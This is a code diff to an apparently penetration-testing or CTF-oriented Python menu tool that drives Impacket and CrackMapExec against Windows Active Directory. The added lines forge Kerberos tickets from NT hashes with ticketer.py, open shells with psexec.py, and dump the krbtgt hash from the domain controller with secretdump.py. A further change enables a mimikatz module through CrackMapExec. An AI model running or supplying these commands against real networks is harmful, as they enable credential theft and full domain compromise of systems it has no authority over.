@@ -37,6 +37,7 @@ if os.geteuid() != 0:
     exit(True)
 
 BH1 = ""
+BH2 = ""
 
 if len(sys.argv) == 3:
    BH1 = sys.argv[1]	# NEO4J USERNAME
@@ -1564,15 +1565,16 @@ while True:
          print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
-            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
+            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
             command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
             print("\n[-] Hash or Domain-SID not found...")
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
-             print("\n[-] Golden TGT was not generated...")      
+             print("\n[-] Silver TGT was not generated...")      
 
          print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
          HASH = "." # Reset value
@@ -1582,13 +1584,14 @@ while True:
                HASH = PASS[x].rstrip(" ")                 # GET HASH
 
          if HASH != ".":
-            command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
+            command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
             command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
 
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
-            print("\n[-] Golden TGT was not generated...")
+            print("\n[-] Silver TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1596,6 +1599,7 @@ while True:
 # CONTRACT: GitHub
 # Version : Monteverde
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
+# Details : Golden Ticket!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1621,6 +1625,7 @@ while True:
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
             print("[-] Golden TGT was not generated...")
 
@@ -1636,6 +1641,7 @@ while True:
 
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
             print("[-] Golden TGT was not generated...")
       prompt()
@@ -1811,7 +1817,7 @@ while True:
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
-#        command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
          HASH = "." # Reset Value
          for x in range (0, MAXX):
